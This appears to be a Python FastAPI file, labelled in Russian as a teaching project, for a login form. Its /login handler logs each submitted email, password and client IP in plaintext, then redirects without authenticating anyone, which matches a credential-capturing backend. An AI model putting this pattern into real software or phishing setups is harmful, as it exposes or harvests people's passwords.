# main.py
from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
import logging
from datetime import datetime
import uvicorn

# Настраиваем логирование. Все сообщения будут выводиться в консоль.
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Создаем экземпляр приложения FastAPI
app = FastAPI(title="Учебный проект: Форма входа")

# Указываем папку для HTML-шаблонов
templates = Jinja2Templates(directory="templates")

@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    """Обрабатывает GET-запрос и отображает главную страницу с формой."""
    # Рендерим HTML-шаблон и передаем в него объект запроса
    return templates.TemplateResponse("index.html", {"request": request})

@app.post("/login")
async def handle_login(request: Request, email: str = Form(...), password: str = Form(...)):
    """
    Обрабатывает POST-запрос из формы.
    Получает email и пароль, логирует их и перенаправляет пользователя.
    """
    # Получаем текущее время и IP-адрес клиента (если доступен)
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_host = request.client.host if request.client else "N/A"

    # Формируем и выводим сообщение в лог (консоль сервера)
    log_message = (
        f"[{current_time}] Новые данные из формы. "
        f"IP: {client_host}, "
        f"Email: '{email}', "
        f"Password: '{password}'"
    )
    logger.info(log_message)  # <-- Ключевая строка: данные появляются здесь

    # После обработки перенаправляем пользователя обратно на главную страницу
    return RedirectResponse(url="/", status_code=303)

# Этот блок позволяет запускать приложение командой `python main.py`
if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
